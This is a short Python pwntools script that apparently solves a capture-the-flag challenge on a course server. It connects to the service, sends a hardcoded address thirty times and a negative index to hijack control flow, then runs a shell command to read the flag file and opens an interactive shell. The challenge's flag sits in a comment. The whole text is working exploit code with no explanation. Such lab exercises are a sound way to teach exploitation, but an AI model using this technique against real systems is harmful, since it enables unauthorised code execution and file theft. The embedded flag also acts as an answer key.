#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}

host , port = 'csie.ctf.tw' , 10121

y = remote(host,port)

num = 30

y.sendlineafter( ':' , str( num ) )

for i in range( num ):
    y.sendline( str( 0x8048580 ) )

y.sendlineafter( ':' , '-100' )

sleep(3)

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()

